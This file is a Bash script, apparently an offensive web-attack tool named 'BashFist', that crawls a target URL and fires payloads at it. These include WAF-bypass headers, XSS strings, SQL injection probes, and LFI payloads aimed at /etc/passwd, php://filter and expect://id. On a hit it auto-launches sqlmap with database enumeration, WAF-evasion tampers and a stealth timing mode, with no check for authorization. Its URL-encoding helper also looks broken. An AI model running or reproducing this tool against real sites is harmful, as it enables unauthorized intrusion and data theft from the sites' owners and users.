#!/bin/bash

#  Colors 
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; CYAN='\033[0;36m'; NC='\033[0m'

# Args 
if [ -z "$1" ]; then
  echo -e "${RED}[!] Usage: $0 <target_url> [--stealth]${NC}"
  exit 1
fi
TARGET="$1"
STEALTH=false
for a in "$@"; do
  [[ "$a" == "--stealth" ]] && STEALTH=true
done

# Global control for skipping current tool on Ctrl-C 
SKIP_CURRENT=0
CHILD_PID=""
on_sigint() {
  SKIP_CURRENT=1
  echo -e "\n${YELLOW}[!] SIGINT received -> skipping current tool soon...${NC}"
  if [[ -n "$CHILD_PID" ]]; then
    kill -INT "$CHILD_PID" 2>/dev/null || kill -TERM "$CHILD_PID" 2>/dev/null || true
  fi
}
trap 'on_sigint' INT

# ---------- Helpers ----------
UA_LIST=(
"Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
"Mozilla/5.0 (X11; Linux x86_64)"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
)
ua() { echo "${UA_LIST[$((RANDOM % ${#UA_LIST[@]}))]} BashFist"; }

log()  { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
fail() { echo -e "${RED}[-]${NC} $1"; }
sec()  { echo -e "\n${BLUE}==== $1 ====${NC}"; }

stealth() {
  if $STEALTH; then
    sleep $((RANDOM % 3 + 1))
  fi
}

url_domain() {
  local u="$1"
  echo "$u" | awk -F/ '{print $3}'
}

normalize_url() {
  local u="$1"
  if [[ ! "$u" =~ ^http ]]; then u="http://$u"; fi
  if [[ "$u" =~ ^https?://[^/]+$ ]]; then u="$u/"; fi
  echo "$u"
}

TARGET="$(normalize_url "$TARGET")"

# safe fetch
fetch() { curl -s -A "$(ua)" -L "$1"; }

# encoding helper (uses python3)
enc() {
  python3 - <<PY 2>/dev/null
import urllib.parse,sys
print(urllib.parse.quote(sys.argv[1]))
PY
}

# wrapper to run a long-running tool/command and let Ctrl-C skip it
run_tool() {
  SKIP_CURRENT=0
  CHILD_PID=""
  cmd="$1"
  echo -e "${CYAN}>>> Running: ${cmd}${NC}"
  bash -c "$cmd" &
  CHILD_PID=$!
  wait $CHILD_PID 2>/dev/null
  rc=$?
  CHILD_PID=""
  if [ $SKIP_CURRENT -eq 1 ]; then
    echo -e "${YELLOW}[!] Skipped by user (Ctrl-C). Moving to next module.${NC}"
  else
    echo -e "${GREEN}[+] Command finished (exit:$rc).${NC}"
  fi
  stealth
}

# ---------- 1) Liveness + fingerprint ----------
sec "Target Liveness & Fingerprint"
if curl -sI -A "$(ua)" "$TARGET" >/dev/null; then
  log "Target is reachable: $TARGET"
else
  fail "Target unreachable."
  exit 1
fi
stealth

echo -e "${CYAN}-- Response Headers --${NC}"
curl -sI -A "$(ua)" "$TARGET" | sed 's/^/  /'
stealth

sec "Security Headers"
req_headers=$(curl -sI -A "$(ua)" "$TARGET")
check_hdr() { echo "$req_headers" | grep -i -q "^$1:" && echo -e "  ${GREEN}$1: present${NC}" || echo -e "  ${YELLOW}$1: missing${NC}"; }
check_hdr "Content-Security-Policy"
check_hdr "X-Frame-Options"
check_hdr "X-Content-Type-Options"
check_hdr "Referrer-Policy"
check_hdr "Strict-Transport-Security"
check_hdr "Permissions-Policy"
echo "$req_headers" | grep -E -i 'cloudflare|akamai|incapsula|sucuri|awswaf|mod_security' >/dev/null && warn "Possible WAF/CDN detected via headers."
stealth

# ---------- 2) Quick Dir Nip ----------
sec "Quick Dir Nip (tiny wordlist)"
WORDLIST=( ".git/HEAD" ".env" "robots.txt" ".well-known/security.txt" "admin/" "login/" "backup/" "server-status" )
for p in "${WORDLIST[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" -A "$(ua)" "${TARGET%/}/$p")
  if [[ "$code" =~ ^20[0-9]$|^30[0-9]$ ]]; then
    warn "Found: /$p  (HTTP $code)"
  else
    echo -e "  /$p -> $code"
  fi
  stealth
done

# ---------- 3) Crawl (shallow) & Param discovery ----------
sec "Crawl (shallow) & Parameter Discovery"
MAX_LINKS=60
domain="$(url_domain "$TARGET")"
declare -A SEEN
declare -a QUEUE
QUEUE+=("$TARGET")
PARAM_URLS=()
JS_URLS=()

while ((${#QUEUE[@]})); do
  url="${QUEUE[0]}"; QUEUE=("${QUEUE[@]:1}")
  [[ -n "${SEEN[$url]}" ]] && continue
  SEEN[$url]=1

  html="$(fetch "$url")"
  [[ -z "$html" ]] && continue

  # extract hrefs and form actions
  links=$(echo "$html" | grep -Eoi 'href=["'\'']?[^"'\'' >]+' | cut -d= -f2- | tr -d '"' | tr -d "'" )
  actions=$(echo "$html" | grep -Eoi 'action=["'\'']?[^"'\'' >]+' | cut -d= -f2- | tr -d '"' | tr -d "'" )
  # extract JS srcs
  jsfiles=$(echo "$html" | grep -Eoi '<script[^>]+src=["'\''][^"'\'' ]+' | grep -Eo 'src=["'\''][^"'\'' ]+' | cut -d= -f2- | tr -d '"' | tr -d "'" )

  all=$(printf "%s\n%s\n%s\n" "$links" "$actions" "$jsfiles" | sed 's/#.*$//' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | grep -v '^$' | head -n 600)

  while read -r L; do
    [[ -z "$L" ]] && continue
    if [[ "$L" =~ ^https?:// ]]; then
      abs="$L"
    elif [[ "$L" =~ ^/ ]]; then
      abs="$(echo "$TARGET" | awk -F/ '{print $1"//"$3}')$L"
    else
      base="${url%/*}/"
      abs="$base$L"
    fi
    [[ "$(url_domain "$abs")" == "$domain" ]] || continue

    # track js files separately
    if [[ "$abs" =~ \.js($|\?) ]]; then JS_URLS+=("$abs"); fi

    if [[ "$abs" =~ \? ]]; then PARAM_URLS+=("$abs"); fi
    if ((${#SEEN[@]} < MAX_LINKS)); then
      if [[ ! "$abs" =~ \.(png|jpg|jpeg|gif|svg|ico|css|js|pdf|zip)(\?|$) ]]; then
        QUEUE+=("$abs")
      fi
    fi
  done <<< "$all"

  (( ${#SEEN[@]} >= MAX_LINKS )) && break
  stealth
done

UNIQ_PARAM_URLS=($(printf "%s\n" "${PARAM_URLS[@]}" | awk '!seen[$0]++'))
UNIQ_JS_URLS=($(printf "%s\n" "${JS_URLS[@]}" | awk '!seen[$0]++'))

if ((${#UNIQ_PARAM_URLS[@]}==0)); then
  fail "No parameterized URLs discovered."
else
  log "Discovered parameterized URLs: ${#UNIQ_PARAM_URLS[@]}"
  printf "  %s\n" "${UNIQ_PARAM_URLS[@]}"
fi
if ((${#UNIQ_JS_URLS[@]}>0)); then
  log "Discovered JS files: ${#UNIQ_JS_URLS[@]}"
  printf "  %s\n" "${UNIQ_JS_URLS[@]}"
fi

param_names() {
  local u="$1"
  echo "$u" | awk -F'?' '{print $2}' | tr '&' '\n' | awk -F'=' '{print $1}' | grep -v '^$' | sort -u
}

# ---------- 4) JS Endpoint & Source-map Analyzer (unique) ----------
sec "JS Endpoint & Source-map Analyzer"
if ((${#UNIQ_JS_URLS[@]}==0)); then
  echo "  No JS files found in crawl."
else
  for js in "${UNIQ_JS_URLS[@]}"; do
    echo -e "${CYAN}-- JS: $js --${NC}"
    js_body="$(curl -s -A "$(ua)" "$js")"
    # Extract endpoints (http(s):// and /api/ etc)
    echo "$js_body" | grep -Eo '(https?://[^"'\'' )]+|/[_A-Za-z0-9/-]{3,}/[A-Za-z0-9_-]{2,}' | sed 's/[",;)]$//' | sed 's/^\s*//' | uniq | sed 's/^/  /' | head -n 40
    # try to fetch source-map if referenced
    map_ref=$(echo "$js_body" | grep -Eo '//# sourceMappingURL=.*|/*# sourceMappingURL=.*' | tail -n1 | sed -E 's/.*sourceMappingURL=//;s/["'\'' ]//g')
    if [[ -n "$map_ref" ]]; then
      # make absolute
      if [[ "$map_ref" =~ ^https?:// ]]; then map_url="$map_ref"; else map_url="$(echo "$js" | sed 's#/[^/]*$##')/$map_ref"; fi
      echo "  Trying source-map: $map_url"
      map_body=$(curl -s -A "$(ua)" "$map_url")
      if [[ -n "$map_body" ]]; then
        warn "  Source-map fetched (may contain original filenames/endpoints). Showing hints:"
        echo "$map_body" | grep -Eo '"file"|"sources"|"sourceRoot"|http[^"]+' | sed 's/^/    /' | head -n 40
      else
        echo "    source-map not reachable"
      fi
    fi
    stealth
    if [ $SKIP_CURRENT -eq 1 ]; then break; fi
  done
fi

# ---------- 5) Header Fuzzing (X-Forwarded-For / Host / Referer) ----------
sec "Header Fuzzing (WAF/Host Bypass hints)"
HDRS_TO_TRY=(
"X-Forwarded-For: 127.0.0.1"
"X-Originating-IP: 127.0.0.1"
"X-Remote-IP: 127.0.0.1"
"X-Host: localhost"
"Referer: https://google.com"
"Host: localhost"
"X-Forwarded-Proto: https"
)
for h in "${HDRS_TO_TRY[@]}"; do
  if [ $SKIP_CURRENT -eq 1 ]; then SKIP_CURRENT=0; break; fi
  echo -e "  Trying header: ${h}"
  out=$(curl -s -I -A "$(ua)" -H "$h" "$TARGET" | head -n 20)
  echo "$out" | sed 's/^/    /'
  stealth
done

# ---------- 6) Parameter Mutation Fuzzer (unique) ----------
sec "Param Mutation Fuzzer (discover hidden param names)"
MUTATIONS=( "" "0" "_old" "_bak" "[] " "%5B%5D" "_id" "[]_old" "_new" "_test" "_v1" "_param" )
for u in "${UNIQ_PARAM_URLS[@]}"; do
  names=($(param_names "$u"))
  [[ ${#names[@]} -eq 0 ]] && continue
  echo -e "${CYAN}-- $u --${NC}"
  for n in "${names[@]}"; do
    for m in "${MUTATIONS[@]}"; do
      newname="${n}${m}"
      # craft test URL replacing param name using a simple approach: change param key occurrences
      test_url="$(echo "$u" | sed "s/\([?&]\)$n=/\1$newname=/g")"
      code=$(curl -sk -o /dev/null -w "%{http_code}" -A "$(ua)" "$test_url")
      if [[ "$code" =~ ^20[0-9]$|^30[0-9]$ ]]; then
        echo "  mutation: ${n} -> ${newname}  (HTTP $code)"
      else
        echo "  mutation: ${n} -> ${newname}  ($code)"
      fi
      stealth
      if [ $SKIP_CURRENT -eq 1 ]; then break 3; fi
    done
  done
done

# ---------- 7) XSS Tests (advanced payloads, DOM/context inference) ----------
sec "XSS Tests (advanced payloads + simple DOM context inference)"
XSS_MARK="BFISTXSS$RANDOM"
XSS_PAYLOADS=(
"$XSS_MARK\" onmouseover=alert(1) autofocus"
"$XSS_MARK<svg/onload=alert(1)>"
"$XSS_MARK'><img src=x onerror=alert(1)>"
"$XSS_MARK\"><script>eval(atob('YWxlcnQoMSk='))</script>"
"$XSS_MARK'><svg><script>alert(1)</script></svg>"
)
# DOM/context inference helper: search snippet around marker
context_search() {
  local body="$1" marker="$2"
  echo "$body" | grep -o -E ".{0,60}$marker.{0,60}" | sed 's/^/    /' | head -n 3
}

for u in "${UNIQ_PARAM_URLS[@]}"; do
  names=($(param_names "$u"))
  [[ ${#names[@]} -eq 0 ]] && continue
  echo -e "${CYAN}-- $u --${NC}"
  for n in "${names[@]}"; do
    for p in "${XSS_PAYLOADS[@]}"; do
      ep="$(enc "$p")"
      test_url="$u"
      if echo "$u" | grep -q "[?&]$n="; then
        test_url="$(echo "$u" | sed "s/\([?&]$n=\)[^&]*/\1$ep/g")"
      else
        sep=$(echo "$u" | grep -q '?' && echo '&' || echo '?')
        test_url="${u}${sep}${n}=$ep"
      fi
      body="$(curl -s -A "$(ua)" "$test_url")"
      if echo "$body" | grep -q "$XSS_MARK"; then
        warn "Reflected marker detected on param '${n}' (possible reflective XSS). Payload: ${p}"
        echo "  Context hints:"
        context_search "$body" "$XSS_MARK"
      else
        echo "  param $n -> no reflection for payload (checked)"
      fi
      if [ $SKIP_CURRENT -eq 1 ]; then break 3; fi
      stealth
    done
  done
done

# ---------- 8) SQLi: error-based + boolean-diff + timing-based (time blind) + auto-run sqlmap ----------
sec "SQLi Tests (error-based + boolean-diff + timing-based + sqlmap auto-run)"
ERR_PAT='SQL syntax|Warning: mysqli_|You have an error in your SQL|PostgreSQL|SQLSTATE|ORA-|SQLite|ODBC'
SQLMAP_FLAGS="--random-agent --keep-alive --threads=5 --no-cast --tamper=modsecurityversioned,space2comment --flush-session --fresh-queries --batch --risk=3 --level=5"

# timing-based helper: measure response time of URL
measure_time() {
  local url="$1"
  # returns time in seconds with millisecond precision
  t=$(curl -s -A "$(ua)" -o /dev/null -w "%{time_total}" "$url")
  echo "$t"
}

run_sqlmap_on() {
  local base_url="$1" param="$2"
  if echo "$base_url" | grep -q "[?&]$param="; then
    sql_target="$base_url"
  else
    sep=$(echo "$base_url" | grep -q '?' && echo '&' || echo '?')
    sql_target="${base_url}${sep}${param}=1"
  fi
  cmd="sqlmap -u \"$sql_target\" -dbs $SQLMAP_FLAGS"
  if ! command -v sqlmap >/dev/null 2>&1; then
    echo -e "${YELLOW}[!] sqlmap not found in PATH; skipping sqlmap auto-run.${NC}"
    return
  fi
  run_tool "$cmd"
}

for u in "${UNIQ_PARAM_URLS[@]}"; do
  names=($(param_names "$u"))
  [[ ${#names[@]} -eq 0 ]] && continue
  echo -e "${CYAN}-- $u --${NC}"
  for n in "${names[@]}"; do
    # error injection
    inj1="'"
    if echo "$u" | grep -q "[?&]$n="; then
      test_err="$(echo "$u" | sed "s/\([?&]$n=\)[^&]*/\1$inj1/g")"
    else
      sep=$(echo "$u" | grep -q '?' && echo '&' || echo '?')
      test_err="${u}${sep}${n}=$inj1"
    fi
    body="$(curl -s -A "$(ua)" "$test_err")"
    if echo "$body" | grep -Eqi "$ERR_PAT"; then
      warn "Param '${n}': SQL error patterns observed (error-based SQLi)."
      run_sqlmap_on "$u" "$n"
      if [ $SKIP_CURRENT -eq 1 ]; then break 2; fi
    else
      echo "  param $n -> no obvious SQL error messages"
    fi
    stealth

    # boolean diff
    TRUE_PAY="' AND 1=1 -- "
    FALSE_PAY="' AND 1=2 -- "
    mkurl() {
      local base="$1" param="$2" payload="$3"
      if echo "$base" | grep -q "[?&]$param="; then
        echo "$base" | sed "s/\([?&]$param=\)[^&]*/\1$(enc "$payload")/g"
      else
        local sep; sep=$(echo "$base" | grep -q '?' && echo '&' || echo '?')
        echo "${base}${sep}${param}=$(enc "$payload")"
      fi
    }
    turl=$(mkurl "$u" "$n" "$TRUE_PAY")
    furl=$(mkurl "$u" "$n" "$FALSE_PAY")
    tlen=$(curl -s -A "$(ua)" "$turl" | wc -c)
    stealth
    flen=$(curl -s -A "$(ua)" "$furl" | wc -c)
    diff=$(( tlen - flen ))
    adiff=${diff#-}
    if [ "$adiff" -ge 50 ]; then
      warn "Param '${n}': boolean response size diff ~${adiff} bytes (possible SQLi)."
      run_sqlmap_on "$u" "$n"
      if [ $SKIP_CURRENT -eq 1 ]; then break 2; fi
    else
      echo "  param $n -> boolean-diff inconclusive (Δ=${adiff})"
    fi
    stealth

    # timing-based blind check (quick)
    # Try to inject a sleep if MySQL: "1' AND SLEEP(5) -- " ; measure delta vs control
    ctrl_time=$(measure_time "$u")
    sleep_payload="' AND SLEEP(5) -- "
    tp_url=$(mkurl "$u" "$n" "$sleep_payload")
    sleep_time=$(measure_time "$tp_url")
    # compute numeric diff (float compare)
    # use awk to compute difference (handles floats)
    dt=$(awk -v a="$sleep_time" -v b="$ctrl_time" 'BEGIN{printf "%.3f", a-b}')
    # threshold 3.5s
    thr=3.5
    comp=$(awk -v v="$dt" -v t="$thr" 'BEGIN{print (v>t)?1:0}')
    if [ "$comp" -eq 1 ]; then
      warn "Param '${n}': timing-based difference ${dt}s -> possible time-based blind SQLi."
      run_sqlmap_on "$u" "$n"
      if [ $SKIP_CURRENT -eq 1 ]; then break 2; fi
    else
      echo "  param $n -> timing diff ${dt}s (no clear time-based SQLi)"
    fi
    stealth
  done
  if [ $SKIP_CURRENT -eq 1 ]; then SKIP_CURRENT=0; continue; fi
done

# ---------- 9) LFI / Path traversal: advanced payloads ----------
sec "LFI & Path Traversal (advanced payload set)"
LFI_PAYLOADS=(
"../../../../../../etc/passwd"
"../../../../../../etc/passwd%00"
"../../../../../../../../../../etc/passwd"
"php://filter/convert.base64-encode/resource=index.php"
"expect://id"
"zip://%2fetc%2fpasswd%23file"
"data:text/plain,<?php phpinfo(); ?>"
"....//....//etc/passwd"
"/proc/self/environ"
"../../../../../../var/www/html/config.php"
"../../../../../../../../windows/win.ini"
)

LFI_KEYS='file|path|page|include|template|view|id|doc'
for u in "${UNIQ_PARAM_URLS[@]}"; do
  names=($(param_names "$u"))
  pick=()
  for n in "${names[@]}"; do
    if echo "$n" | grep -Eiq "$LFI_KEYS"; then pick+=("$n"); fi
  done
  ((${#pick[@]}==0)) && continue
  echo -e "${CYAN}-- $u --${NC}"
  for n in "${pick[@]}"; do
    for pay in "${LFI_PAYLOADS[@]}"; do
      if echo "$u" | grep -q "[?&]$n="; then
        t="$(echo "$u" | sed "s/\([?&]$n=\)[^&]*/\1$(enc "$pay")/g")"
      else
        sep=$(echo "$u" | grep -q '?' && echo '&' || echo '?')
        t="${u}${sep}${n}=$(enc "$pay")"
      fi
      body="$(curl -s -A "$(ua)" "$t")"
      if echo "$body" | grep -q "^root:.*:0:0:" || echo "$body" | grep -q "x:0:0:root" || echo "$body" | grep -qi "phpinfo(" || echo "$body" | grep -qi "define(" ; then
        warn "Param '${n}': LFI-ish content detected with payload '$pay'. (heuristic)"
        break
      else
        echo "  param $n -> payload $pay -> no obvious LFI content"
      fi
      if [ $SKIP_CURRENT -eq 1 ]; then break 3; fi
      stealth
    done
  done
done

# ---------- 10) Multipart/form-data XSS probe ----------
sec "Multipart/Form-data XSS probe (file/form parsing contexts)"
# attempt to send multipart payload to each param as form field if page seems to accept POST
for u in "${UNIQ_PARAM_URLS[@]}"; do
  names=($(param_names "$u"))
  [[ ${#names[@]} -eq 0 ]] && continue
  echo -e "${CYAN}-- $u --${NC}"
  for n in "${names[@]}"; do
    payload="<svg/onload=alert(1)>$XSS_MARK"
    ep="$(enc "$payload")"
    # craft a minimal multipart POST to the endpoint path (strip query)
    action="$(echo "$u" | cut -d'?' -f1)"
    echo "  Trying multipart POST to $action with field $n"
    # use curl's multipart form
    curl -s -A "$(ua)" -X POST -F "${n}=${payload}" "$action" -o /dev/null -w "    HTTP %{http_code}\n"
    stealth
    if [ $SKIP_CURRENT -eq 1 ]; then break 2; fi
  done
done

# ---------- 11) Final wrap ----------
sec "Done"
log "All modules executed live; no files written. Use --stealth to add small delays."
echo -e "${YELLOW}Tip:${NC} If a long tool (sqlmap) is running, press Ctrl-C to skip it and continue to next module."

# End of script

